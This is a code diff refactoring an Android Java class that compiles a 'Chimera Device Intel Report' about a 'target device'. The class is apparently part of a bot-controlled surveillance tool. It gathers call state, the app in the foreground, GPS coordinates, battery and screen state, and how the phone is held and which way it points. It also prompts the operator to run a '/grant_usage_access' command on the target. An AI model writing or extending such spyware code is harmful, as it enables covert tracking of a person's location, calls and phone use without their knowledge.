@@ -21,8 +21,6 @@ import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
-import android.util.DisplayMetrics;
-import android.view.WindowManager;
 import androidx.core.app.ActivityCompat;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
@@ -33,20 +31,17 @@ import java.util.TreeMap;
 
 public class DeviceDetailsHelper {
 
-    public interface DetailsCallback {
-        void onDetailsReady(String details);
-    }
+    public interface DetailsCallback { void onDetailsReady(String details); }
 
     public static void getDeviceDetails(Context context, DetailsCallback callback) {
         if (!hasUsageStatsPermission(context)) {
-            String permissionMessage = "Foreground App detection requires the 'Usage Access' permission.\n\nPlease run the `/grant_usage_access` command to open the required settings page on the target device and enable the permission for this app.";
-            callback.onDetailsReady(permissionMessage);
+            String msg = "Foreground App detection requires 'Usage Access' permission.\n\n"
+                       + "Please run the `/grant_usage_access` command to open the required settings page on the target device and enable the permission for this app.";
+            callback.onDetailsReady(msg);
             return;
         }
-
         StringBuilder details = new StringBuilder();
-        details.append("`Chimera Device Intel Report`\n");
-        details.append("`====================`\n\n");
+        details.append("`Chimera Device Intel Report`\n`====================`\n\n");
         details.append("*--- Device Info ---*\n");
         details.append("`Manufacturer:` ").append(Build.MANUFACTURER).append("\n");
         details.append("`Model:       ` ").append(Build.MODEL).append("\n");
@@ -57,7 +52,6 @@ public class DeviceDetailsHelper {
         details.append(getScreenState(context));
         details.append(getCallState(context));
         details.append(getForegroundApp(context)).append("\n");
-
         getSensorAndLocationInfo(context, sensorInfo -> {
             details.append(sensorInfo);
             callback.onDetailsReady(details.toString());
@@ -71,16 +65,14 @@ public class DeviceDetailsHelper {
     }
 
     private static String getBatteryInfo(Context context) {
-        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent batteryStatus = context.registerReceiver(null, filter);
+        Intent batteryStatus = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
         if (batteryStatus == null) return "`Battery Info: ` Not Available\n";
         int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
         int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
         float batteryPct = level * 100 / (float) scale;
-        String statusStr = "Unknown";
+        String statusStr = "Discharging";
         if (status == BatteryManager.BATTERY_STATUS_CHARGING) statusStr = "Charging";
-        if (status == BatteryManager.BATTERY_STATUS_DISCHARGING) statusStr = "Discharging";
         if (status == BatteryManager.BATTERY_STATUS_FULL) statusStr = "Full";
         return "`Battery:     ` " + (int) batteryPct + "% (" + statusStr + ")\n";
     }
@@ -91,30 +83,23 @@ public class DeviceDetailsHelper {
     }
 
     private static String getCallState(Context context) {
-        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-            return "`Call State:  ` Permission Denied\n";
-        }
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) return "`Call State:  ` Permission Denied\n";
         TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-        int callState = tm.getCallState();
         String state = "Idle";
-        if (callState == TelephonyManager.CALL_STATE_RINGING) state = "Ringing";
-        if (callState == TelephonyManager.CALL_STATE_OFFHOOK) state = "On Call";
+        if (tm.getCallState() == TelephonyManager.CALL_STATE_RINGING) state = "Ringing";
+        if (tm.getCallState() == TelephonyManager.CALL_STATE_OFFHOOK) state = "On Call";
         return "`Call State:  ` " + state + "\n";
     }
 
     private static String getForegroundApp(Context context) {
-        String currentApp = "Not Available";
+        String currentApp = "Unknown";
         UsageStatsManager usm = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
         long time = System.currentTimeMillis();
-        List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 1000, time);
+        List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 60 * 1000, time);
         if (appList != null && !appList.isEmpty()) {
-            SortedMap<Long, UsageStats> mySortedMap = new TreeMap<>();
-            for (UsageStats usageStats : appList) {
-                mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);
-            }
-            if (!mySortedMap.isEmpty()) {
-                currentApp = mySortedMap.get(mySortedMap.lastKey()).getPackageName();
-            }
+            SortedMap<Long, UsageStats> sortedMap = new TreeMap<>();
+            for (UsageStats usageStats : appList) sortedMap.put(usageStats.getLastTimeUsed(), usageStats);
+            if (!sortedMap.isEmpty()) currentApp = sortedMap.get(sortedMap.lastKey()).getPackageName();
         }
         return "`Foreground App: ` " + currentApp;
     }
@@ -123,13 +108,12 @@ public class DeviceDetailsHelper {
     private static void getSensorAndLocationInfo(Context context, DetailsCallback callback) {
         StringBuilder sensorDetails = new StringBuilder();
         FusedLocationProviderClient locationClient = LocationServices.getFusedLocationProviderClient(context);
-        Task<Location> locationTask = locationClient.getLastLocation();
-        locationTask.addOnCompleteListener(task -> {
+        locationClient.getLastLocation().addOnCompleteListener(task -> {
             sensorDetails.append("*--- Location ---*\n");
             if (task.isSuccessful() && task.getResult() != null) {
-                Location location = task.getResult();
-                sensorDetails.append("`Lat/Lon: ` ").append(location.getLatitude()).append(", ").append(location.getLongitude()).append("\n");
-                sensorDetails.append("`Accuracy:` ").append(location.getAccuracy()).append(" meters\n\n");
+                Location loc = task.getResult();
+                sensorDetails.append("`Lat/Lon: ` ").append(loc.getLatitude()).append(", ").append(loc.getLongitude()).append("\n");
+                sensorDetails.append("`Accuracy:` ").append(loc.getAccuracy()).append(" meters\n\n");
             } else {
                 sensorDetails.append("`Location:` Not Available or Permission Denied\n\n");
             }
@@ -141,14 +125,13 @@ public class DeviceDetailsHelper {
     }
 
     private static void analyzeSensors(Context context, DetailsCallback callback) {
-        SensorManager sensorManager = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
-        Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
-        Sensor magnetometer = sensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
-        StringBuilder sensorAnalysis = new StringBuilder();
-        sensorAnalysis.append("*--- Sensor Analysis ---*\n");
+        SensorManager sm = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
+        Sensor accelerometer = sm.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
+        Sensor magnetometer = sm.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
+        StringBuilder analysis = new StringBuilder("*--- Sensor Analysis ---*\n");
         if (accelerometer == null || magnetometer == null) {
-            sensorAnalysis.append("Orientation sensors not available.\n");
-            callback.onDetailsReady(sensorAnalysis.toString());
+            analysis.append("Orientation sensors not available.\n");
+            callback.onDetailsReady(analysis.toString());
             return;
         }
         final float[][] sensorData = new float[2][];
@@ -159,20 +142,20 @@ public class DeviceDetailsHelper {
             }
             @Override public void onAccuracyChanged(Sensor s, int a) {}
         };
-        sensorManager.registerListener(listener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
-        sensorManager.registerListener(listener, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);
+        sm.registerListener(listener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
+        sm.registerListener(listener, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            sensorManager.unregisterListener(listener);
+            sm.unregisterListener(listener);
             if (sensorData[0] != null) {
                 float x = sensorData[0][0], y = sensorData[0][1], z = sensorData[0][2];
-                if (Math.abs(z) > 8.5) sensorAnalysis.append("`Position:  ` Lying flat, screen ").append(z > 0 ? "UP." : "DOWN.").append("\n");
-                else if (Math.abs(y) > 8.5) sensorAnalysis.append("`Position:  ` Upright (Portrait).\n");
-                else if (Math.abs(x) > 8.5) sensorAnalysis.append("`Position:  ` On its side (Landscape).\n");
-                else sensorAnalysis.append("`Position:  ` Held at an angle.\n");
+                if (Math.abs(z) > 9.0) analysis.append("`Position:  ` Lying flat, screen ").append(z > 0 ? "UP." : "DOWN.").append("\n");
+                else if (Math.abs(y) > 9.0) analysis.append("`Position:  ` Upright (Portrait).\n");
+                else if (Math.abs(x) > 9.0) analysis.append("`Position:  ` On its side (Landscape).\n");
+                else analysis.append("`Position:  ` Held at an angle.\n");
             }
             if (sensorData[0] != null && sensorData[1] != null) {
-                float[] R = new float[9], I = new float[9];
-                if (SensorManager.getRotationMatrix(R, I, sensorData[0], sensorData[1])) {
+                float[] R = new float[9];
+                if (SensorManager.getRotationMatrix(R, null, sensorData[0], sensorData[1])) {
                     float[] orientation = new float[3];
                     SensorManager.getOrientation(R, orientation);
                     float azimuth = (float) Math.toDegrees(orientation[0]);
@@ -182,10 +165,10 @@ public class DeviceDetailsHelper {
                     else if (azimuth < 112.5) direction = "East"; else if (azimuth < 157.5) direction = "SE";
                     else if (azimuth < 202.5) direction = "South"; else if (azimuth < 247.5) direction = "SW";
                     else if (azimuth < 292.5) direction = "West"; else if (azimuth < 337.5) direction = "NW";
-                    sensorAnalysis.append("`Direction: ` Top of device pointing ").append(direction).append(" (").append((int)azimuth).append("°).\n");
+                    analysis.append("`Direction: ` Top of device pointing ").append(direction).append(" (").append((int)azimuth).append("°).\n");
                 }
             }
-            callback.onDetailsReady(sensorAnalysis.toString());
+            callback.onDetailsReady(analysis.toString());
         }, 1500);
     }
 }
